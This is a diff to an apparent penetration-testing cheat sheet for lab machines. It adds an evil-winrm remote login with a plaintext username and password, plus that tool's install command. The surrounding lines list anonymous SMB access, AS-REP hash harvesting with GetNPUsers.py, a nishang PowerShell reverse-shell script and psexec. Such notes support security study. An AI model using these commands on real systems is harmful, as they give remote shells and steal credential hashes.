@@ -47,6 +47,8 @@ smbclient -U anonymous  //10.10.10.130/batshare
 # get user hahses 
 GetNPUsers.py DOMAIN/ -usersfile ausers.txt
 
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
+
 SHELLS
 cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
 psexec.py  'user:pass@localhost' cmd
@@ -151,6 +153,7 @@ gobuster
 mdbtools
 seclists
 shellter + dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+gem install evil-winrm
 
 VARIOUS
 #Decrypt LUKS
